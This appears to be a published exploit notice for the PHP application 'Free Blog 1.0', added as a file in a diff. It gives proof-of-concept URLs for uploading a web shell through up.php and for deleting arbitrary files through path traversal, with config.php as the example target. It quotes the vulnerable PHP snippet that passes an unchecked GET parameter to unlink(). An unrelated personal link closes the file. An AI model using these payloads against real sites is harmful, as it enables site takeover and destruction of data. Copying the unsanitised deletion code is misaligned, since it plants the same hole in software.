@@ -1,0 +1,35 @@
+# Free Blog 1.0 Multiple Vulnerability
+# By cr4wl3r http://bastardlabs.info
+# http://bastardlabs.info/exploits/Free_Blog.txt
+# Software Link: http://blog.sdnex.com/
+# Tested: Ubuntu 12.04.1 LTS
+
+Proof of concept:
+
+Arbitrary File Upload Vulnerability
+
+   http://bastardlabs/blog_path/up.php
+
+Shell will be available here
+
+   http://bastardlabs/blog_path/log/images/shell.php
+
+
+
+Arbitrary File Deletion Vulnerability
+
+----------
+49 <?php
+50 if($_GET['del']){ 
+51 $id=$_GET['del'];
+52 unlink("./log/images/$id");
+53 }
+54 ?>
+----------
+
+   http://bastardlabs/blog_path/up.php?del=../../[file]
+   http://bastardlabs/blog_path/up.php?del=../../config.php
+
+------------------------------
+My sweetheart
+http://www.photoshow.com/watch/rx9IX5ZS
